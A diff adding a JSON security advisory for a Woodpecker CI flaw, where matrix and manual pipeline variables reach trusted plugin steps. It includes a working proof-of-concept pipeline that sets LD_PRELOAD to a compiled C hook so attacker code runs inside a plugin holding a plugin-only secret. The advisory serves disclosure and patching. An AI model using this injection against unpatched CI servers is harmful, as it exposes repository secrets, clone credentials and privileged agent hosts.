@@ -1,0 +1,39 @@
+{
+  "modified": "2026-11-08T21:11:03Z",
+  "published": "2026-11-08T21:11:03Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-xwpq-2mq8-p55x",
+  "details": "### Summary\n\nWoodpecker treats a step as a trusted plugin only if the pipeline author did not set `commands`, `entrypoint` or `environment` on it. Only plugin steps get secrets that are limited to plugin images, privileged mode from `WOODPECKER_PLUGINS_PRIVILEGED`, and the clone credentials for trusted clone images.\r\n\r\nKeys from the workflow `matrix:` and the variables of a manual pipeline were still copied into the environment of every step, plugin steps included, while the step stayed a plugin. A user who can run a pipeline with their own config can set variables like `LD_PRELOAD` or `PATH` inside a trusted plugin image and run their own code there, with that plugin's secrets and privileges.\r\n\r\nThis bypasses the protection added for CVE-2024-41122 (GHSA-3wf2-2pq4-4rvc).\n\n### Details\n\nThe pipeline builder adds every matrix axis to the global compiler environment (`pipeline/frontend/builder/builder.go`):\r\n\r\n    environ := metadata.Environ()\r\n    maps.Copy(environ, axis)\r\n    ...\r\n    compiler.WithEnviron(environ),\r\n    compiler.WithEnviron(b.Envs),\r\n\r\n`createProcess` (`pipeline/frontend/yaml/compiler/convert.go`) then copies this map into the environment of each step, without checking the step type:\r\n\r\n    environment := map[string]string{}\r\n    maps.Copy(environment, c.env)\r\n\r\n`Container.IsPlugin()` only looks at the step's own YAML fields (`commands`, `entrypoint`, `environment`). `matrix:` is a top-level key, so the step is still a plugin. It still passes the plugin filter for secrets and the privileged plugin list.\r\n\r\nManual pipelines had the same path: the `variables` of `POST /api/repos/{repo_id}/pipelines` were merged into the same environment in `server/pipeline/items.go`.\r\n\r\nThe environment blocklist added for CVE-2024-41122 in v2.7.0 (#3934) only applied to secrets mapped into env. It never covered matrix values, and it was removed in v3.0.0 (#4363) together with the old `secrets:` syntax.\r\n\r\nFixed in v3.18.0:\r\n- #7036 (26d18d9): matrix variables are only added to non-plugin steps (they are still usable in `when` filters).\r\n- #7040 (652e05c): additional variables, such as manual pipeline variables, are only added to non-plugin steps.\n\n### Proof of concept\n\nSetup: a Woodpecker server and agent \u003c 3.18.0. A repository secret `registry_password`, limited to the plugin image `woodpeckerci/plugin-docker-buildx` (secret setting \"Plugins filter\"). The attacker has push access to the repository.\r\n\r\n1. Commit this `.woodpecker.yaml`:\r\n\r\n    matrix:\r\n      LD_PRELOAD:\r\n        - /woodpecker/hook.so\r\n\r\n    steps:\r\n      - name: build-hook\r\n        image: gcc\r\n        commands:\r\n          - |\r\n            cat \u003e /woodpecker/hook.c \u003c\u003c'C'\r\n            #include \u003cstdio.h\u003e\r\n            #include \u003cstdlib.h\u003e\r\n            __attribute__((constructor)) static void run(void) {\r\n              FILE *f = fopen(\"/woodpecker/leak.txt\", \"w\");\r\n              if (f) { fprintf(f, \"%s\\n\", getenv(\"PLUGIN_PASSWORD\") ? \"secret visible\" : \"no secret\"); fclose(f); }\r\n            }\r\n            C\r\n          - gcc -shared -fPIC -o /woodpecker/hook.so /woodpecker/hook.c\r\n\r\n      - name: plugin\r\n        image: woodpeckerci/plugin-docker-buildx\r\n        depends_on: [build-hook]\r\n        settings:\r\n          password:\r\n            from_secret: registry_password\r\n\r\n      - name: show\r\n        image: alpine\r\n        depends_on: [plugin]\r\n        commands:\r\n          - cat /woodpecker/leak.txt\r\n\r\n2. Push and let the pipeline run.\r\n3. The `plugin` step still gets the secret (it is still a plugin), and the loader runs `hook.so` inside it. The `show` step prints \"secret visible\", so attacker code ran inside the plugin with the plugin-only secret.\r\n\r\nThe same works with a manual pipeline: start it from the UI or API with the variable `LD_PRELOAD=/woodpecker/hook.so` instead of the `matrix:` block.\r\n\r\nOn v3.18.0 and later, `LD_PRELOAD` is not set in the plugin step, and `show` prints nothing (or the file is missing).\n\n### Impact\n\nWho is impacted: instances where any of these protections matter:\r\n- secrets limited to plugin images (\"Plugins filter\"),\r\n- plugins in `WOODPECKER_PLUGINS_PRIVILEGED` (they run privileged, so this can lead to agent host takeover),\r\n- custom clone steps with a trusted clone image, which get the netrc credentials of the repo owner.\r\n\r\nAny user who can run a pipeline with a config they control (push access, or an approved pull request from a fork) can run their own code inside such a plugin and read its secrets, use its privileged mode, or read the clone credentials.\r\n\r\nWorkaround, if you cannot update: use the approval gate for all events and review pipeline config changes before they run, do not limit sensitive secrets only by plugin image, and keep `WOODPECKER_PLUGINS_PRIVILEGED` empty.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "woodpecker-server",
+        "purl": "pkg:dhi/woodpecker-server"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.18.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "go",
+        "source_package": "go.woodpecker-ci.org/woodpecker/v3"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xwpq-2mq8-p55x"
+    }
+  ]
+}
